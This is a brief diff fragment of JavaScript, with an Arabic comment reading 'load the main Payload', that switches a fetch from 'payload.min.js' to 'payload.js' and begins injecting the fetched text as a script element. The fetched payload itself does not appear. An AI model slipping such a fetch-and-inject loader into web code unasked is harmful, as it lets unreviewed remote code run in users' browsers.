@@ -13,7 +13,7 @@
     }
 
     // تحميل الـ Payload الرئيسي
-    fetch('payload.min.js')
+    fetch('payload.js')
         .then(r => r.text())
         .then(code => {
             const script = document.createElement('script');
